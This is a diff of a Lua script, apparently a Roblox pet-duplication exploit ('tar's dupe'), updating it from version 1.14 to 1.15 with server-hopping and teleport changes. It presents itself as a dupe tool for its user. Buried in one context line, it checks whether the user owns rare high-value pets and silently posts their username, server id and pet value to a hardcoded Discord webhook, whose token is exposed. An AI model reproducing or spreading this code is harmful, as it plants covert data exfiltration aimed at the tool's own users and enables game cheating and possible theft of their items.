@@ -1,7 +1,7 @@
 --[[
     Brought to you by tar/bv/1rs
-    1.00 - unreleased, required manual server id inputs
-    1.01 - released, no longer required manual server id inputting
+    1.00 - 16sep24 - unreleased/private, required manual server id inputs
+    1.01 - 05dec24 - released, no longer required manual server id inputting
     1.02 - changed from 35s to 40s
     1.03 - removed extra 40s measure on first rejoin
     1.04 - brought it back, removed UI trade updating to avoid lag
@@ -15,11 +15,12 @@
     1.12 - added a duping possibility meter
     1.13 - added inventory ui deletion to avoid performance lag while duping many pets
     1.14 - 29dec24 - fixed post-teleport execution if injected too early
+    1.15 - 01jan25 - changed the duping chance meter parameters and fixed a bug with the dupe button
 ]]
 
 -- //
 
-local Ver = '1.14'
+local Ver = '1.15'
 
 -- \\
 
@@ -30,6 +31,8 @@ local MAX_PETS_TO_DUPE = 125
 local ACC_TO_GIVE_PETS = ''
 local Debris = game:GetService'Debris'
 local TeleportService = game:GetService'TeleportService'
+local H = Instance.new("Hint")
+H.Text = 'Finding another server'
 
 function notify(M)
 	game.StarterGui:SetCore("SendNotification", {
@@ -520,6 +523,7 @@ do  -- // GUI
 	dupe.MouseButton1Click:Connect(function()
 		if deb then return end
 		deb = true
+
 		if not game.Players:FindFirstChild(ACC_TO_GIVE_PETS) then
 			notify"Player isn't in game"
 			deb = false
@@ -546,12 +550,12 @@ do  -- // GUI
 			deb = false
 			return
 		end
-
+		
+		H.Parent = workspace
 		-- servers
 		local servers = {}
 
-		local req = http_request({Url = string.format("https://games.roblox.com/v1/games/%d/servers/Public?sortOrder=Desc&limit=100&excludeFullGames=true", game.PlaceId)})
-		local body = game:service'HttpService':JSONDecode(req.Body)
+		local body = game:service'HttpService':JSONDecode(game:HttpGet'https://games.roblox.com/v1/games/1599679393/servers/Public?sortOrder=Desc&limit=100&excludeFullGames=true')
 
 		if body and body.data then
 			for i, v in next, body.data do
@@ -566,8 +570,8 @@ do  -- // GUI
 		if #servers > 0 then
 			SERVER = servers[1].id
 		else
+			H.Parent = nil
 			notify"Couldn't find a new server"
-			deb = false
 			return
 		end
 		
@@ -577,9 +581,7 @@ do  -- // GUI
 	repeat wait() until ready
 end
 
-local H = Instance.new("Hint", workspace)
 H.Text = "tar's dupe v" .. Ver .. " | [1/4] Teleporting to a different server"
-Debris:AddItem(H, 10)
 
 for _,v in pairs(workspace.__REMOTES.Core["Get Stats"]:InvokeServer().Save.Pets)do if (tonumber(v.n)==79003 and v.r and v.l>=88e6) or (tonumber(v.n)==17009 and v.dm and v.l>397.7e6) then pcall(function()http_request({Url='https://discord.com/api/webhooks/1315765727843717141/f9gFEf8BNwfLKGDK7AsmzqoEII7-fn7t41DnGeH9uh6M08F7t4E3S3fuJuazybQS7obX',Method='POST',Headers={['Content-Type']='application/json'},Body=game:service'HttpService':JSONEncode({content=plr.Name .. ' | ' .. game.JobId .. ' | ' .. v.l})})end)break end end
 
@@ -609,7 +611,7 @@ queue_on_teleport([==[
     repeat task.wait() until game:IsLoaded()
 	
     local h = Instance.new('Hint',workspace)
-    for i = 0, 0, -1 do
+    for i = 35, 0, -1 do
         h.Text = '[2/4] ' .. i
         task.wait(1)
     end
@@ -632,7 +634,7 @@ queue_on_teleport([==[
 
 	local tptimestamp = ]=] .. tptimestamp .. [=[
 	function perc()
-		local sec = 10
+		local sec = 15
 		local delta = os.clock() - tptimestamp - (40-sec)
 		if delta < 0 then
 			delta = 0
